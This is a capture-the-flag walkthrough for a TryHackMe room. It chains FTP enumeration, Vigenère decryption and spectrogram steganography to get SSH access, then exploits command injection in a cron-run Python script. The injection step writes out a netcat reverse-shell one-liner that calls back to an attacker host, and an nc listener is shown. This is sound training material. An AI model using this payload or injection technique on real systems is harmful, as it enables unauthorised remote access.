# Break-Out-Of-Cage | Tryhackme | Writeup 

| Category          | Details               |
|-------------------|-----------------------|
| Platform          | [Break-out-of-cage](https://tryhackme.com/room/breakoutthecage1) |
|  Difficulty       | Easy                  |
| Target machine    | Ubuntu Linux          |
| Attacker Machine  | Kali linux            |
| Tools             | Nmap, Gobuster, [Chiper Identifier](https://www.dcode.fr/cipher-identifier), [Spectrogram](https://www.boxentriq.com/steganography/audio-spectrogram), [Cyber Chef](https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://gchq.github.io/CyberChef/&ved=2ahUKEwiY_uzBu4yVAxWzk1YBHT7XNGcQFnoECAwQAQ&usg=AOvVaw3cJhXGWs_4gKkmjmhQLSNC)  |


# Reconnaissance
Perform an Nmap scan to identify open ports and running services on the target.

[Nmap Scan](../Try-Hack-Me/images/break-out-of-cage/nmap%20scan.png)

The Nmap scan reveals the following open ports:
| Port      | Service       |
| --------- |---------------|
| 21/tcp    | ftp           |
| 22/tcp    | ssh           |
| 80/tcp    | http          |

# Enumeration 

Let's check whether the FTP service permits anonymous login.

[FTP login](../Try-Hack-Me/images/break-out-of-cage/ftp%20login.png)

Anonymous FTP access provides a file named `dad_tasks`.<br>
```
UWFwdyBFZWtjbCAtIFB2ciBSTUtQLi4uWFpXIFZXVVIuLi4gVFRJIFhFRi4uLiBMQUEgWlJHUVJPISEhIQpTZncuIEtham5tYiB4c2kgb3d1b3dnZQpGYXouIFRtbCBma2ZyIHFnc2VpayBhZyBvcWVpYngKRWxqd3guIFhpbCBicWkgYWlrbGJ5d3FlClJzZnYuIFp3ZWwgdnZtIGltZWwgc3VtZWJ0IGxxd2RzZmsKWWVqci4gVHFlbmwgVnN3IHN2bnQgInVycXNqZXRwd2JuIGVpbnlqYW11IiB3Zi4KCkl6IGdsd3cgQSB5a2Z0ZWYuLi4uIFFqaHN2Ym91dW9leGNtdndrd3dhdGZsbHh1Z2hoYmJjbXlkaXp3bGtic2lkaXVzY3ds
```

The contents are Base64-encoded. Decoding them produces another seemingly garbled block of text.<br>
used [chiper Identifier](https://www.dcode.fr/cipher-identifier) to figure out the chiper used got a many suggestions. Let's keep these aside and drill into the webpage and find any key if possible. 

[Webpage](../Try-Hack-Me/images/break-out-of-cage/webpage.png)

The website appears to be a simple static page with no functional links. To uncover hidden content, perform directory enumeration with Gobuster.
```
# Got the below directories 
/images
/html
/scripts
/auditions
```

Among the discovered directories, /auditions contains a corrupted audio file that warrants further analysis.<br>
Playing the audio reveals dialogue from Nicolas Cage followed by unusual noise, suggesting the presence of hidden data.<br>
Viewing the audio in a [spectrogram](https://www.boxentriq.com/steganography/audio-spectrogram) reveals hidden text embedded within the sound.

[Auditions directory](../Try-Hack-Me/images/break-out-of-cage/auditions%20directory.png)

[Audio Spectrogram](../Try-Hack-Me/images/break-out-of-cage/audio-file.png)

## cracking password
Combining the clues gathered so far, we now have both a potential decryption key from the spectrogram and a likely cipher identified earlier. <br>
Of the candidate ciphers suggested by Cipher Identifier, the `Vigenère cipher` proves to be the correct choice.

Using the keyword extracted from the spectrogram, decrypt the Vigenère ciphertext to recover Weston's SSH password.
```
Dads Tasks - The RAGE...THE CAGE... THE MAN... THE LEGEND!!!!
One. Revamp the website
Two. Put more quotes in script
Three. Buy bee pesticide
Four. Help him with acting lessons
Five. Teach Dad what "information security" is.

In case I forget.... <password_here>
```

# Initial Access

Log in to the target over SSH using the recovered credentials.
[ssh login](../Try-Hack-Me/images/break-out-of-cage/ssh%20login.png)

Initial access is successfully obtained.

After logging in, recurring broadcast messages from Cage appear on the terminal, indicating that an automated task is running in the background.<br>
Run pspy64 to monitor processes and identify scheduled cron jobs executing on the system.

[pspy64 list](../Try-Hack-Me/images/break-out-of-cage/pspy64.png)

`pspy64` reveals a Python script executed periodically at `/opt/.dads_scripts/spread_the_quotes.py`
```
#!/usr/bin/env python

#Copyright Weston 2k20 (Dad couldnt write this with all the time in the world!)
import os
import random

lines = open("/opt/.dads_scripts/.files/.quotes").read().splitlines()
quote = random.choice(lines)
os.system("wall " + quote)
```
This Python script reads a list of `quotes` from the file `/opt/.dads_scripts/.files/.quotes` and randomly selects one of them using the random module.<br>
It then uses the `wall` command to broadcast the selected quote as a message to all logged-in users on the system. The script executes the command through `os.system()`, which invokes a shell to run wall. <br>
Because user-controlled input is concatenated directly into an `os.system()` call without sanitization, the script is vulnerable to command injection. By modifying the `.quotes` file, arbitrary commands can be executed with the privileges of the scheduled task.<br>

Exploit the command injection vulnerability by appending a reverse shell payload to the `.quotes` file.
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ATTACKER-IP PORT >/tmp/f
```

Append the payload to the .quotes file so it is executed the next time the scheduled script runs.

```
echo "hello;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ATTACKER-IP PORT >/tmp/f
```

Set up a listener on the attack box 
```
nc -lvnp 4444
```

After the cron job executes, the reverse shell connects back to the listener, providing a shell as the `cage` user.

[cage shell](../Try-Hack-Me/images/break-out-of-cage/cage%20login.png)

# Privilege Escalation 

Access as the `cage` user allows retrieval of the user flag from `/home/cage/Super_Duper_Checklist`.

The email_backup directory contains three emails, with the third providing an important clue for privilege escalation.
```
From - Cage@nationaltreasure.com
To - Weston@nationaltreasure.com

Hey Son

Buddy, Sean left a note on his desk with some really strange writing on it. I quickly wrote
down what it said. Could you look into it please? I think it could be something to do with his
account on here. I want to know what he's hiding from me... I might need a new agent. Pretty
sure he's out to get me. The note said:

<REDACTED>

The guy also seems obsessed with my face lately. He came him wearing a mask of my face...
was rather odd. Imagine wearing his ugly face.... I wouldnt be able to FACE that!! 
hahahahahahahahahahahahahahahaahah get it Weston! FACE THAT!!!! hahahahahahahhaha
ahahahhahaha. Ahhh Face it... he's just odd. 

Regards

The Legend - Cage
```

The third email contains a ciphertext and hints that the sender's agent is "obsessed with his face." <br>
The repeated emphasis on face serves as the keyword for decrypting the message using the `Vigenère cipher`, ultimately revealing the root password.

Decrypting the message successfully reveals the root account password.

After logging in as root, retrieve the final flag from the email stored in `/root/email_backup.`

[USER FLAG](../Try-Hack-Me/images/break-out-of-cage/user%20flag.png)

[ROOT FLAG](../Try-Hack-Me/images/break-out-of-cage/root%20flag.png)

Root flag & User Flag found!<br>
Hope this Writeup was fun, easy to follow and helpful to you.<br>

Happy Hacking ~!!!